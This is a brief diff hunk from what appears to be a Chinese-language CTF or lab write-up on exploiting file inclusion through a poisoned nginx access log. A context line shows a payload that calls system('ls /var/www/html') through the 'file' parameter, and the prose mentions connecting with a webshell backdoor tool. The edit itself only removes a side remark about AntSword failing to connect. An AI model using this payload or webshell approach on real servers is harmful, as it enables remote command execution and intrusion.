@@ -39,7 +39,7 @@ Cookie: UM_distinctid=17ffcdc88eb73a-022664ffe42c5b8-13676d4a-1fa400-17ffcdc88ec
 Connection: close
 ```
 
-可以直接命令执行即可也可以用webshell后门工具连接（蚁剑连接不上是怎么回事）
+可以直接命令执行即可也可以用webshell后门工具连接
 
 ```
 ?file=/var/log/nginx/access.log&2=system('ls /var/www/html');phpinfo();
